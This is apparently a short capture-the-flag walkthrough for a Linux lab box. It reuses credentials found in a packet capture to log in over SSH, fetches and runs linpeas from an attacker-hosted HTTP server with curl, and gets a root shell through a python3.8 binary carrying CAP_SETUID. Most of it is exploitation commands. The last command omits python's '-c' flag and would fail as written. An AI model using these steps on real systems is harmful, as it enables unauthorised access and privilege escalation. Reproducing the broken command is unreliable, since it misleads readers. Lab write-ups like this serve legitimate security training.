uses ftp > 20, 21, ssh > 22, http > 80

-> go to the website and scope the website for endpoints

-> there seems to be a subdir when you capture 
```bash
/data/{number}
```

-> we can enumerate the numbers, from 0 ~ 8

-> at *pcap 0*, we found the credentials for nathan.

-> we can try sshing using the same credentials

-> inside we can grab linpeas, since this is a linux machine and run it by,

```bash
python3 -m http.server 8000
```

-> and curling from the other side

```bash
curl -o linpeas.sh http://<YOUR_tun0_IP>:8000/linpeas.sh
```

-> make it executable

```bash
chmod +x linpeas.sh
```

-> run it.


---

-> on the files with capabilities section, we can find python3.8 as vulnerable, with a capability of `CAP_SETUID`

-> we can bypass the usual kernel permission checks if the executable has certain capabilities set

> from gtfobins.org/gtfobins/python

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

=> since we are using python3.8 we load it using the actual binary path

```bash
/usr/bin/python3.8 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

-> we instantly get root, find the flag in /root/ !